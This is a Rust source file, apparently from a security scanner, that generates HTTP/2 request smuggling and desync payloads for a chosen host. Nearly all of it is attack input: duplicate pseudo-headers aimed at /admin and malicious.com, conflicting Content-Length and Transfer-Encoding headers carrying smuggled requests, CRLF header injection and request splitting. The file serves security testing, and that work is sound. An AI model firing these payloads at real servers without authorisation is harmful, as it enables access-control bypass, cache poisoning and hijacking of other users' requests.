use super::{format_cookies, format_custom_headers};

/// Generate H2 (HTTP/2 Protocol) smuggling attack payloads
/// HTTP/2 desync attacks exploit discrepancies in how front-end and back-end servers handle HTTP/2 features
/// Reference: https://portswigger.net/research/http2
pub fn get_h2_payloads(
    path: &str,
    host: &str,
    method: &str,
    custom_headers: &[String],
    cookies: &[String],
) -> Vec<String> {
    let custom_header_str = format_custom_headers(custom_headers);
    let cookie_str = format_cookies(cookies);

    // Shared request head (request line, Host, custom headers, cookies); `push`
    // appends the pseudo-header / body tail that distinguishes each payload.
    let head =
        format!("{method} {path} HTTP/1.1\r\nHost: {host}\r\n{custom_header_str}{cookie_str}");
    let mut payloads = Vec::with_capacity(30);
    let mut push = |rest: &str| payloads.push(format!("{head}{rest}"));

    // === HTTP/2 Pseudo-Header Injection Attacks ===
    // These attacks exploit how servers handle duplicate or malformed pseudo-headers

    // Duplicate :method pseudo-header
    push(":method: GET\r\n:method: POST\r\nContent-Length: 0\r\n\r\n");
    // Duplicate :path pseudo-header
    push(&format!(
        ":path: {path}\r\n:path: /admin\r\nContent-Length: 0\r\n\r\n"
    ));
    // Duplicate :authority pseudo-header (similar to Host header in HTTP/2)
    push(&format!(
        ":authority: {host}\r\n:authority: malicious.com\r\nContent-Length: 0\r\n\r\n"
    ));
    // Duplicate :scheme pseudo-header
    push(":scheme: https\r\n:scheme: http\r\nContent-Length: 0\r\n\r\n");

    // === Header Name with Colon Attacks ===
    // HTTP/2 allows colons in header names (as pseudo-headers), but HTTP/1.1 doesn't

    // Header name starting with colon (non-pseudo-header)
    push(":custom-header: value\r\nContent-Length: 0\r\n\r\n");
    // Header name with colon in the middle
    push("x-custom:header: value\r\nContent-Length: 0\r\n\r\n");

    // === HTTP/2 Content-Length Conflicts ===
    // HTTP/2 uses frame length, but some proxies still process Content-Length

    // Content-Length mismatch with smuggled request
    push(&format!(
        "Content-Length: 0\r\n\r\nGET /smuggled HTTP/1.1\r\nHost: {host}\r\n\r\n"
    ));

    // Multiple Content-Length headers (forbidden in HTTP/2 but might be forwarded).
    // The second (larger) Content-Length must equal the smuggled request's byte
    // length so a back-end that honors it consumes exactly the smuggled request
    // and leaves the socket clean. A hardcoded length only matched a 10-char host.
    let h2_dual_cl_smuggled = format!("GET /smuggled HTTP/1.1\r\nHost: {host}\r\n\r\n");
    push(&format!(
        "Content-Length: 0\r\nContent-Length: {}\r\n\r\n{}",
        h2_dual_cl_smuggled.len(),
        h2_dual_cl_smuggled
    ));

    // === Header Value with Newline Attacks ===
    // HTTP/2 doesn't allow newlines in header values, but HTTP/1.1 might accept them

    // Header value with embedded newline
    push("X-Custom: value1\nX-Injected: injected\r\nContent-Length: 0\r\n\r\n");
    // Header value with CRLF injection
    push("X-Custom: value1\r\nX-Injected: injected\r\nContent-Length: 0\r\n\r\n");

    // === HTTP/2 Transfer-Encoding (forbidden in HTTP/2) ===
    // HTTP/2 forbids Transfer-Encoding, but proxies might forward it to HTTP/1.1 backends

    // Transfer-Encoding in HTTP/2 context (should be rejected but might be smuggled)
    push("Transfer-Encoding: chunked\r\nContent-Length: 6\r\n\r\n0\r\n\r\nG");

    // === Connection-Specific Headers (forbidden in HTTP/2) ===
    // HTTP/2 forbids connection-specific headers like Connection, Keep-Alive, etc.

    // Connection header (forbidden in HTTP/2)
    push("Connection: close\r\nContent-Length: 0\r\n\r\n");
    // Keep-Alive header (forbidden in HTTP/2)
    push("Keep-Alive: timeout=5\r\nContent-Length: 0\r\n\r\n");
    // Proxy-Connection header (forbidden in HTTP/2)
    push("Proxy-Connection: keep-alive\r\nContent-Length: 0\r\n\r\n");

    // === Case Sensitivity Attacks ===
    // HTTP/2 requires lowercase header names, HTTP/1.1 is case-insensitive

    // Mixed-case pseudo-header (invalid in HTTP/2)
    push(":Method: POST\r\nContent-Length: 0\r\n\r\n");
    // Uppercase pseudo-header (invalid in HTTP/2)
    push(":PATH: /admin\r\nContent-Length: 0\r\n\r\n");

    // === Header Field Ordering Attacks ===
    // HTTP/2 requires pseudo-headers before regular headers

    // Regular header before pseudo-header (violates HTTP/2 spec)
    push("X-Custom: value\r\n:method: POST\r\nContent-Length: 0\r\n\r\n");

    // === HTTP/2 Header Name Validation Bypass ===
    // Test characters that are valid in HTTP/2 but not in HTTP/1.1

    // Header name with underscore (more permissive in HTTP/2)
    push("x_custom_header: value\r\nContent-Length: 0\r\n\r\n");

    // === Content-Length: 0 with Body ===
    // HTTP/2 uses frame length, so Content-Length: 0 with body might be processed differently

    push("Content-Length: 0\r\n\r\nunexpected body content");

    // === HTTP/2 Downgrade with Smuggled Request ===
    // Attack that exploits HTTP/2 to HTTP/1.1 downgrade

    push(&format!(
        "HTTP2-Settings: AAMAAABkAARAAAAAAAIAAAAA\r\nContent-Length: 0\r\n\
         Transfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /smuggled HTTP/1.1\r\nHost: {host}\r\n\r\n"
    ));

    // === Request Splitting via Header Injection ===
    // Inject full request in header value

    push(&format!(
        "X-Custom: value\r\n\r\nGET /smuggled HTTP/1.1\r\nHost: {host}\r\nContent-Length: 0\r\n\r\n"
    ));

    // === Additional HTTP/2 Specific Attacks ===

    // HTTP/2 with multiple pseudo-headers of different types
    push(":method: GET\r\n:path: /admin\r\n:authority: malicious.com\r\nContent-Length: 0\r\n\r\n");

    // Transfer-Encoding with pseudo-header (combining forbidden elements)
    push(":method: POST\r\nTransfer-Encoding: chunked\r\nContent-Length: 6\r\n\r\n0\r\n\r\nG");

    // Pseudo-header after body (severe HTTP/2 violation)
    push("Content-Length: 0\r\n\r\n:path: /injected");

    // Multiple Content-Length with pseudo-header
    push(&format!(
        ":authority: {host}\r\nContent-Length: 8\r\nContent-Length: 0\r\n\r\nsmuggled"
    ));

    payloads
}
